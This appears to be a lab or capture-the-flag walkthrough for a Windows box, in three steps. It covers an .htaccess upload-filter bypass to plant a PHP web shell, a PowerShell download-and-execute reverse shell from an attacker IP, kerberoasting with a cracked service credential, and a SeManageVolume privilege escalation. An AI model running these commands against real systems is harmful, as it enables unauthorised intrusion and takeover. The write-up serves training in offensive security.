#box

*Created: 2/14/2026*

### Step 1

**Tags:** #.htaccess #Web-Shell #Reverse-Shell #Arbitrary-File-Upload #File-Upload-Bypass

**Command:**
```http
Content-Disposition: form-data; name="the_file"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .ops
```

*Port: 80 | 💎 GEM*

> 
> The first step of the machine involves spotting a vulnerability on the upload functionality of a website hosted on port 80. Inside the website it's possible to click on 'Buy Tickets' and once clicked on the 'Buy Now' button a modal opens up. From there we can upload an arbitrary file but a blacklist is in place impeding us to upload `.php` and its derivates files, including `.phtml` , `.phar` etc. We opt to override the `.htaccess` file appending a custom extension that will be interpreted as php and then upload a webshell that will permit us to gain a reverse shell. Within a basic enumeration we also discover the location of the uploads folder being at `/uploads` so we have full control of what we upload.

---

### Step 2

**Tags:** #Invoke-ConPtyShell #Reverse-Shell #Rubeus #hashcat #TGS-Hash #RunasCs.exe #runas

**Command:**
```bash
IEX(IWR http://192.168.45.165:8000/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp 192.168.45.165 -RemotePort 3389 -Rows 70 -Cols 253
```

*Port: 3389*

> 
> We stabilize our shell with `Invoke-ConPtyShell.ps1` and then we discover we're running as `svc_apache`. This permits us to try kerberoast for other users. Due to difficulties in using SharpHound and transferring the extraction on our end and since we don't have a credential for that user nor we can authenticate in any way to this machine we proceed to uploading `Invoke-Kerberoast.ps1`  or `Rubeus.exe` and obtain the tgs hash for `svc_mssql`. We proceed to crack it, having the credentials for `svc_mssql:trustno1`

---

### Step 3

**Tags:** #SeManageVolume #DLL-Injection #msfvenom #Reverse-Shell

**Command:**
```bash
curl http://192.168.45.165:8000/SeManageVolumeExploit.exe -o SeManageVolumeExploit.exe
```

*💎 GEM*

> 
> After stabilizing once again the shell with `Invoke-ConPtyShell.ps1` we discover that user has the `SeManageVolumePrivilege`. This privilege can be exploited to gain a privileged shell with [SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit). This exploit unlocks the `C:\Windows` folder and makes it writable by every user of the machine. Overriding a dll will permit us to gain a shell as SYSTEM.

---

